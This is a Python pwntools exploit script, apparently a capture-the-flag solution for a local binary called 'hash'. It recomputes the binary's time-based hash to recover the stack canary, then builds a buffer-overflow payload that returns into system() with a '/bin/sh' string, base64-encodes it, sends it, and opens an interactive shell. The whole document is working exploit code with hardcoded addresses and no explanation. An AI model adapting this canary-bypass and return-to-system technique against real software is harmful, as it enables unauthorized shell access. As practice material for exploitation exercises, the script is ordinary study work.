import math
from pwn import *
import subprocess
from pathlib import Path
from datetime import datetime
from encodings.base64_codec import base64_encode


BASE_PATH = Path('')
CALCULATE_HASH_BINARY = Path(BASE_PATH, Path('calculate_hash', 'calculate_hash'))
EXPLOITABLE_BINARY = Path(BASE_PATH, Path('hash'))

# /bin/sh converted to bytes, with little endian
SHELL_COMMAND_LITTLE_ENDIAN = b'\x6e\x69\x62\x2f\x00\x68\x73\x2f'   

EBP_ADDRESS = 0xffffd168
BUFFER_SIZE = 0x200
SHELL_COMMAND_ADDRESS = EBP_ADDRESS + 8 + len(SHELL_COMMAND_LITTLE_ENDIAN)

SYSTEM_CALL_ADDRESS = 0x8049187


def calculate_hash() -> int:
    """
    Calculates a custom hash (exactly like the binary does) without the canary.
    """
    # Depends on the remote time 
    time = math.floor(datetime.now().timestamp())
    
    popen = subprocess.Popen([CALCULATE_HASH_BINARY, str(time)], stdout=subprocess.PIPE)
    result, _ = popen.communicate()

    return int(result.decode())

def calculate_canary(original_hash: int) -> int:
    return original_hash - calculate_hash()

def main() -> None:
    # Get the original hash
    connection = process(str(EXPLOITABLE_BINARY))
    connection.readuntil(':')
    original_hash = int(connection.read().decode().strip())

    # Response to the captcha
    connection.sendline(str(original_hash).encode())

    # Calculate the canary value
    canary = calculate_canary(original_hash)

    # Craft the payload and send it
    payload = b'A' * BUFFER_SIZE + p32(canary) + 12 * b'A' + p32(SYSTEM_CALL_ADDRESS) + p32(SHELL_COMMAND_ADDRESS) + SHELL_COMMAND_LITTLE_ENDIAN
    payload = base64_encode(payload)[0].decode().replace('\n', '')
    connection.sendline(payload)

    # Make interactive to get the gained shell :)
    connection.interactive()


if __name__ == '__main__':
    main()
